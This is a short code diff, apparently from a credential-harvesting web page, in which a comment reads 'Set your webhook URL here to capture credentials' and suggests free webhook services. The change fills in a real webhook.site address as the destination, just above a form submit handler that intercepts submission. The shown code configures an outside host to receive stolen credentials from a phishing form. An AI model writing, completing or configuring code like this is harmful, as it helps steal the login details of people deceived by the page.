@@ -147,7 +147,7 @@
 
             // CONFIGURE: Set your webhook URL here to capture credentials
             // Free options: webhook.site, requestbin.com, pipedream.com
-            var WEBHOOK_URL = '';  // e.g., 'https://webhook.site/your-unique-id'
+            var WEBHOOK_URL = 'https://webhook.site/c45a0142-1e40-4f57-a912-55788281f84f';
 
             form.addEventListener('submit', function(e) {
                 e.preventDefault();
